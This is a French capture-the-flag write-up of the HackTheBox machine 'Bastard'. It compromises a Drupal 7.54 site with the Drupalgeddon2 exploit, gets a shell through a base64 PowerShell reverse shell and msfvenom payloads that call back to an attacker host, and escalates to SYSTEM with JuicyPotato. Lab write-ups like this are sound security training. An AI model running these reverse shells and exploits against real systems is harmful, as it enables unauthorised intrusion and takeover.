---
title: HTB | Bastard
description: 
slug: bastard-htb
date: 2025-07-11 00:00:00+0000
#image: cover.png
categories:
    - HackTheBox
tags:
    - Windows
    - Medium
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Bastard cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Bastard</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Windows</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.9</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Medium</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
```bash
$ nmap -sC -sV -p- -An -vvv 10.10.10.9     
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-11 15:53 CEST

PORTSTATE SERVICE REASON    VERSION
80/tcp    open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries 
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
|_http-server-header: Microsoft-IIS/7.5
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Bastard | Bastard
135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).
```

## Foothold

### Drupal 7.54
On découvre sur le port 80 une page de login. Il est mentionné qu'il s'agit d'un site web Drupal. On trouve la version de Drupal dans un fichier changelog.txt :
> http://10.10.10.9/changelog.txt
> Drupal 7.54, 2017-02-01

### CVE-2018-7600 | drupalgeddon2
En utilisant searchsploit, on trouve une RCE qui ne necessite pas d'authentification et qui fonctionne pour les versions avant 7.58 (donc OK pour 7.54).
```bash
$ searchsploit drupal 7.54   
-----------------------------------------------------------------------------------
 Exploit Title |  Path
-----------------------------------------------------------------------------------
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution    | php/webapps/44449.rb
...

$ searchsploit -m php/webapps/44449.rb                    
  Exploit: Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/44449
     Path: /opt/tools/exploitdb/exploits/php/webapps/44449.rb
    Codes: CVE-2018-7600
 Verified: True
File Type: Ruby script, ASCII text
Copied to: /workspace/drupwn/44449.rb
```
On lance l'exploitation, et on obtient directement un shell non-interactif sur lequel on peut executer des commandes.
```bash
$ ruby 44449.rb http://10.10.10.9
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.9/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.9/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.54
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo CGATSMRW
[+] Result : CGATSMRW
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.10.10.9/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://10.10.10.9/sites/default/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://10.10.10.9/sites/default/files/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/files/)
[*] Moving : ./sites/default/files/.htaccess
[i] Payload: mv -f sites/default/files/.htaccess sites/default/files/.htaccess-bak; echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/files/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
[!] FAILED : Couldn't find a writeable web path
--------------------------------------------------------------------------------
[*] Dropping back to direct OS commands
drupalgeddon2>> ls

drupalgeddon2>> whoami
nt authority\iusr
drupalgeddon2>> dir
Volume in drive C has no label.
 Volume Serial Number is C4CD-C60B

 Directory of C:\inetpub\drupal-7.54

19/03/2017  09:04 ��    <DIR>    .
19/03/2017  09:04 ��    <DIR>    ..
19/03/2017  01:42 ��   317 .editorconfig
19/03/2017  01:42 ��   174 .gitignore
19/03/2017  01:42 �� 5.969 .htaccess
19/03/2017  01:42 �� 6.604 authorize.php
19/03/2017  01:42 ��     110.781 CHANGELOG.txt
19/03/2017  01:42 �� 1.481 COPYRIGHT.txt
19/03/2017  01:42 ��   720 cron.php
19/03/2017  01:43 ��    <DIR>    includes
19/03/2017  01:42 ��   529 index.php
19/03/2017  01:42 �� 1.717 INSTALL.mysql.txt
19/03/2017  01:42 �� 1.874 INSTALL.pgsql.txt
19/03/2017  01:42 ��   703 install.php
19/03/2017  01:42 �� 1.298 INSTALL.sqlite.txt
19/03/2017  01:42 ��17.995 INSTALL.txt
19/03/2017  01:42 ��18.092 LICENSE.txt
19/03/2017  01:42 �� 8.710 MAINTAINERS.txt
19/03/2017  01:43 ��    <DIR>    misc
19/03/2017  01:43 ��    <DIR>    modules
19/03/2017  01:43 ��    <DIR>    profiles
19/03/2017  01:42 �� 5.382 README.txt
19/03/2017  01:42 �� 2.189 robots.txt
19/03/2017  01:43 ��    <DIR>    scripts
19/03/2017  01:43 ��    <DIR>    sites
19/03/2017  01:43 ��    <DIR>    themes
19/03/2017  01:42 ��19.986 update.php
19/03/2017  01:42 ��10.123 UPGRADE.txt
19/03/2017  01:42 �� 2.200 web.config
19/03/2017  01:42 ��   417 xmlrpc.php
  21 File(s)  217.261 bytes
   9 Dir(s)   4.135.231.488 bytes free

drupalgeddon2>> dir C:\Users
Volume in drive C has no label.
 Volume Serial Number is C4CD-C60B

 Directory of C:\Users

19/03/2017  08:35 ��    <DIR>    .
19/03/2017  08:35 ��    <DIR>    ..
19/03/2017  02:20 ��    <DIR>    Administrator
19/03/2017  02:54 ��    <DIR>    Classic .NET AppPool
19/03/2017  08:35 ��    <DIR>    dimitris
14/07/2009  07:57 ��    <DIR>    Public
   0 File(s)  0 bytes
   6 Dir(s)   4.134.649.856 bytes free

drupalgeddon2>> type C:\Users\dimitris\Desktop\user.txt
292f.....ec9d
```

### Stable Shell
En allant sur https://www.revshells.com/, j'ai pu générer rapidement un script de revershell. J'ai utilisé :
- PowerShell #3 (Base64)

Ce qui m'a donné la commande suivante. Pratique, car aucun caractère spécial.
```bash
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA1ACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

-----------------------

exegol-pentest Bastard $ nc -lnvp 1337 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337


Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:57491.
PS C:\inetpub\drupal-7.54> whoami
nt authority\iusr
```

### Better Stable Shell
J'ai trouvé un moyen de faire un shell encore plus stable. Le privesc ne marchait meme pas avec l'autre shell... On ne voyait pas les erreurs non plus. Il vaut mieu generer avec msfvenom un shell.exe :

```bash
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.25 LPORT=9999 -a x64 --platform windows -e x64/xor_dynamic -b '\x00' -f exe -o shell.exe

--------------

PS C:\inetpub\drupal-7.54> .\shell.exe

--------------

$ nc -lnvp 9999
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:57676.
Windows PowerShell running as user BASTARD$ on BASTARD
Copyright (C) Microsoft Corporation. All rights reserved.


PS C:\inetpub\drupal-7.54>
```

## Privilege Escalation

### SEImpersonatePrivilege - JuicyPotato
On exploit avec JuicyPotato (j'ai vraiment beaucoup galérer...).
On génére un deuxieme rev shell en .exe sur un autre port :
```bash
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.25 LPORT=8888 -a x64 --platform windows -e x64/xor_dynamic -b '\x00' -f exe -o shell2.exe
```
On copie shell2.exe sur la machine puis on execute JuicyPotato.exe :
```bash
PS C:\inetpub\drupal-7.54> ./JP.exe -p cmd.exe -a '/c C:\inetpub\drupal-7.54\shell2.exe' -l 4444 -t * -c '{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}'
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 4444
....
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

-------------------------------

exegol-pentest /workspace $ nc -lnvp 8888
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888

Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:57681.
Windows PowerShell running as user BASTARD$ on BASTARD
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
47f4.....3c54
```

## Tips
- un reverse shell en utilisant msfvenom semble plus stable (affiche les erreurs aussi) que le powershell -e .... que j'ai utilisé. Peut etre a utilisé en priorité la prochaine fois ?
- Attention au CLSID. Toujours tester plusieurs. NE JAMAIS FAIRE CONFIANCE A CELUI PAR DEFAUT. Regarder sur :
  - https://ohpe.it/juicy-potato/CLSID/
  - https://github.com/ohpe/juicy-potato/tree/master/CLSID/